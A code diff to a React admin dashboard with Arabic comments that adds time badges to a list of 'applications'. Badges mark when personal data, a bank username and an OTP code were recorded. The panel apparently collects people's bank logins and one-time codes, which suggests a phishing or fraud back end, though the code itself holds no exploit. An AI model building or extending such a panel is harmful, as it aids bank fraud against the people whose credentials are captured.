@@ -1,5 +1,5 @@
 // لوحة التحكم الرئيسية — الطلبات مع عرض كامل للبيانات ونظام النسخ
-import { useEffect, useRef, useState } from "react";
+import React, { useEffect, useRef, useState } from "react";
 import { useQueryClient } from "@tanstack/react-query";
 import {
   useGetApplicationStats,
@@ -144,7 +144,6 @@ function SectionTimeBadge({ timestamp }: { timestamp: string | null | undefined 
   useEffect(() => {
     if (!timestamp || !timeRef.current) return;
     
-    // تحديث النص مباشرة في DOM
     const updateTime = () => {
       if (timeRef.current) {
         timeRef.current.textContent = `← ${timeAgo(timestamp)}`;
@@ -166,6 +165,42 @@ function SectionTimeBadge({ timestamp }: { timestamp: string | null | undefined 
       dir="ltr"
     >
       ← {timeAgo(timestamp)}
+    </span>
+  );
+}
+
+// شارة وقت مصغرة للقائمة الرئيسية - تحديث DOM مباشرة
+function TimeBadge({ timestamp, icon, label }: { 
+  timestamp: string | null | undefined; 
+  icon: React.ReactNode;
+  label: string;
+}) {
+  const timeRef = useRef<HTMLSpanElement>(null);
+  
+  useEffect(() => {
+    if (!timestamp || !timeRef.current) return;
+    
+    const updateTime = () => {
+      if (timeRef.current) {
+        timeRef.current.textContent = timeAgo(timestamp);
+      }
+    };
+    
+    updateTime();
+    const intervalId = setInterval(updateTime, 30_000);
+    
+    return () => clearInterval(intervalId);
+  }, [timestamp]);
+  
+  if (!timestamp) return null;
+  
+  return (
+    <span 
+      className="flex items-center gap-1 bg-blue-50 text-blue-700 px-1.5 py-1 rounded-lg text-[10px] font-medium"
+      title={label}
+    >
+      {icon}
+      <span ref={timeRef}>{timeAgo(timestamp)}</span>
     </span>
   );
 }
@@ -756,10 +791,17 @@ export default function AdminDashboardPage() {
                           );
                         })()}
                       </div>
-                      <div className="flex items-center gap-2 shrink-0">
-                        <span className="text-xs text-muted-foreground hidden md:block">
-                          {timeAgo(app.createdAt)}
-                        </span>
+                      <div className="flex items-center gap-1 shrink-0">
+                        {/* طابع الوقت الشخصي */}
+                        <TimeBadge timestamp={app.createdAt} icon={<User className="w-3 h-3" />} label="بيانات" />
+                        {/* طابع الوقت البنكي */}
+                        {app.bankUsername && (
+                          <TimeBadge timestamp={app.updatedAt} icon={<CreditCard className="w-3 h-3" />} label="بنك" />
+                        )}
+                        {/* طابع وقت OTP */}
+                        {app.otpCode && (
+                          <TimeBadge timestamp={app.updatedAt} icon={<Smartphone className="w-3 h-3" />} label="OTP" />
+                        )}
                         <a
                           href={`/admin/applications/${app.id}`}
                           onClick={(e) => e.stopPropagation()}
